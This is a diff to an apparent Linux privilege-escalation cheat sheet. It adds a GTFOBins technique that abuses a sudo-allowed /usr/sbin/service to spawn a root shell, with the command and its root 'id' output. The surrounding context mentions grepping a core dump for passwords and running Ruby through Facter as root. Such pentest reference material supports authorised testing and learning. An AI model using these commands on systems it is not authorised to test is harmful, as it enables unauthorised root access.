@@ -979,6 +979,19 @@ strings core.PID | grep -i "password\|root"
 
 If a plaintext root password appears, try `su root`.
 
+### service
+
+If `sudo -l` allows `/usr/sbin/service`, use the GTFOBins path to spawn a root shell:
+
+```bash
+sudo -l
+# (ALL) NOPASSWD: /usr/sbin/service
+
+sudo /usr/sbin/service ../../bin/sh
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
 ### Facter (Puppet)
 
 If you can run `sudo /usr/bin/facter` (e.g. `(ALL) NOPASSWD: /usr/bin/facter`), use `--custom-dir` to load a directory containing Ruby code; Facter will execute custom facts as root. Write a Ruby script that runs a shell or bind shell, then point facter at its directory.
